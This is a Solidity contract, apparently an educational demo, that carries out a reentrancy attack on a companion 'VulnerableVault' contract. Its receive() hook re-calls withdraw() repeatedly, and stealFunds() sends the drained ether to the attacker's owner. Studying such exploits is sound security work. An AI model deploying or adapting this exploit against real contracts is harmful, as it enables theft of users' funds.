// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VulnerableVault} from "./VulnerableVault.sol";

/// @title ReentrancyAttacker
/// @notice DELIBERATELY MALICIOUS — for educational purposes only.
///         Demonstrates how a contract can drain VulnerableVault by
///         repeatedly re-entering `withdraw()` before its balance is
///         ever zeroed out.
contract ReentrancyAttacker {
    VulnerableVault public immutable target;
    address public owner;

    constructor(address _target) {
        target = VulnerableVault(_target);
        owner = msg.sender;
    }

    /// @notice Kicks off the attack: deposit a small amount, then withdraw.
    function attack() external payable {
        require(msg.value > 0, "Send some ETH to attack with");
        target.deposit{value: msg.value}();
        target.withdraw(); // triggers the first callback loop
    }

    /// @notice This is the key mechanism: whenever this contract RECEIVES
    ///         ETH (which happens inside VulnerableVault's withdraw(),
    ///         via `msg.sender.call{value: amount}("")`), Solidity
    ///         automatically runs this function BEFORE returning control
    ///         to the vault. We use that moment to call withdraw() again,
    ///         while the vault still thinks we have a balance.
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(); // re-enter, again and again
        }
    }

    function stealFunds() external {
        require(msg.sender == owner, "Not the attacker's owner");
        payable(owner).transfer(address(this).balance);
    }
}
